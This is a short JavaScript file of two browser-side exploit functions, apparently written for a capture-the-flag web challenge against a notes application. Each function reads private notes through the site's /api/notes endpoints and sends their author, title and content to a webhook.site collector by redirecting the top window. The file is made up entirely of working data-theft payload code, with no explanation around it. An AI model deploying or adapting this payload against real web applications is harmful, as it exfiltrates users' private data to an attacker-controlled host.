function exp_q1(url) {
    fetch(`/api/notes/all`)
        .then((a) => a.json())
        .then((b) => fetch(`/api/notes?id=${b[0].id}`))
        .then((c) => c.json())
        .then((d) => top.location.href = `https://webhook.site/${url}?payload=${d.content}`);
}

function exp_q2(url, name) {
    fetch(`/api/notes?id=${name}`)
        .then((a) => a.json())
        .then((b) => {
            if (b.error) {
                top.location.href = `https://webhook.site/${url}?payload=${b.error}`;
            } else {
                top.location.href = `https://webhook.site/${url}?payload=${b.author}${b.title}${b.content}`;
            }
        });
}